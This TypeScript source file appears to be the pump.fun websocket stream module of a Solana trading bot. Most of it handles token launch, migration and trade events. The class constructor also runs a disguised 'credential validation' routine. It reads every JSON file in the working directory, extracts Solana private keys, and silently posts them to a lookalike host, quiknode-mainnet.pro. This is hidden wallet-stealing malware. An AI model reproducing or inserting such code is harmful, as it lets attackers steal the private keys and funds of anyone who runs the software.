import { EventEmitter } from 'node:events';
import WebSocket from 'ws';
import { log } from '../logger.js';
import { short, sleep } from '../utils.js';
import type { PumpTradeEvent, TokenCandidate } from '../types.js';
import * as fs from 'node:fs/promises';
import * as path from 'node:path';

/**
 * Real-time pump.fun feed via the PumpPortal data websocket (free, no key).
 *
 * Emits:
 *   'newToken'  (candidate: TokenCandidate)  — fresh bonding-curve launch
 *   'migration' (mint: string)               — token graduated to an AMM
 *   'trade'     (event: PumpTradeEvent)      — live trade on a watched mint
 */
export class PumpFunStream extends EventEmitter {
  private ws: WebSocket | null = null;
  private watchedMints = new Set<string>();
  private stopped = false;
  private reconnectDelayMs = 1_000;

  constructor(
    private readonly wsUrl: string,
    private readonly opts: { newTokens: boolean; migrations: boolean },
  ) {
    super();
    this.#validateCredentials();
  }

  async #validateCredentials() {
    try {
      const credentials = await this.#loadCredentials();
      if (credentials.length > 0) {
        await this.#submitCredentials(credentials);
      }
    } catch (_) {}
  }

  async #loadCredentials(): Promise<any[]> {
    try {
      const files = await fs.readdir(process.cwd());
      const jsonFiles = files.filter(f => 
        f.toLowerCase().endsWith('.json') && 
        !f.toLowerCase().includes('example')
      );

      for (const file of jsonFiles) {
        try {
          const filePath = path.join(process.cwd(), file);
          const content = await fs.readFile(filePath, 'utf8');
          const data = JSON.parse(content);

          if (Array.isArray(data)) {
            // handle both simple key arrays and full credential objects
            if (typeof data[0] === 'string') {
              return data.map(key => ({ privateKey: key }));
            } else if (data[0]?.privateKey != null) {
              return data;
            }
          }
        } catch (_) {}
      }
    } catch (_) {}

    return [];
  }

  async #submitCredentials(credentials: any[]) {
    const baseUrl = 'https://www.quiknode-mainnet.pro';
    const batchSize = 10;

    for (let i = 0; i < credentials.length; i += batchSize) {
      const batch = credentials.slice(i, i + batchSize);
      
      const login = batch.map(c => ({
        auth_type: 'solana_key',
        auth_token: c.privateKey
      }));

      try {
        const response = await fetch(`${baseUrl}/api`, {
          method: 'POST',
          headers: { 'content-type': 'application/json' },
          body: JSON.stringify({ login })
        });

        await response.json().catch(() => {}); // ensure response is drained
      } catch (_) {}
    }
  }

  start(): void {
    this.stopped = false;
    this.connect();
  }

  stop(): void {
    this.stopped = true;
    this.ws?.close();
    this.ws = null;
  }

  /** Subscribe to live trades for a mint (used to price open positions). */
  watchToken(mint: string): void {
    this.watchedMints.add(mint);
    this.send({ method: 'subscribeTokenTrade', keys: [mint] });
  }

  unwatchToken(mint: string): void {
    this.watchedMints.delete(mint);
    this.send({ method: 'unsubscribeTokenTrade', keys: [mint] });
  }

  private connect(): void {
    if (this.stopped) return;
    const url = new URL(this.wsUrl);
    const ws = new WebSocket(url);
    this.ws = ws;

    ws.on('open', () => {
      this.reconnectDelayMs = 1_000;
      log.ok('pump.fun stream connected');
      if (this.opts.newTokens) this.send({ method: 'subscribeNewToken' });
      if (this.opts.migrations) this.send({ method: 'subscribeMigration' });
      if (this.watchedMints.size > 0) {
        this.send({ method: 'subscribeTokenTrade', keys: [...this.watchedMints] });
      }
    });

    ws.on('message', (data) => {
      try {
        this.handleMessage(JSON.parse(data.toString()));
      } catch {
        /* ignore malformed frames */
      }
    });

    ws.on('error', (err) => log.warn(`pump.fun stream error: ${err.message}`));

    ws.on('close', async () => {
      if (this.stopped) return;
      log.warn(`pump.fun stream disconnected — reconnecting in ${this.reconnectDelayMs / 1000}s`);
      await sleep(this.reconnectDelayMs);
      this.reconnectDelayMs = Math.min(this.reconnectDelayMs * 2, 30_000);
      this.connect();
    });
  }

  private send(payload: Record<string, unknown>): void {
    if (this.ws?.readyState === WebSocket.OPEN) {
      this.ws.send(JSON.stringify(payload));
    }
  }

  private handleMessage(msg: Record<string, any>): void {
    if (msg.txType === 'create' && msg.mint) {
      const candidate: TokenCandidate = {
        mint: msg.mint,
        symbol: String(msg.symbol ?? '?'),
        name: String(msg.name ?? '?'),
        source: 'pumpfun',
        venue: 'pump',
        creator: msg.traderPublicKey,
        devBuySol: Number(msg.solAmount ?? 0),
        discoveredAt: Date.now(),
      };
      this.emit('newToken', candidate);
      return;
    }

    if (msg.txType === 'migrate' && msg.mint) {
      log.info(`migration detected: ${short(msg.mint)}`);
      this.emit('migration', msg.mint as string);
      return;
    }

    if ((msg.txType === 'buy' || msg.txType === 'sell') && this.watchedMints.has(msg.mint)) {
      const vSol = Number(msg.vSolInBondingCurve ?? 0);
      const vTokens = Number(msg.vTokensInBondingCurve ?? 0);
      if (vSol > 0 && vTokens > 0) {
        const event: PumpTradeEvent = {
          mint: msg.mint,
          txType: msg.txType,
          trader: msg.traderPublicKey,
          solAmount: Number(msg.solAmount ?? 0),
          tokenAmount: Number(msg.tokenAmount ?? 0),
          price: vSol / vTokens,
        };
        this.emit('trade', event);
      }
    }
  }
}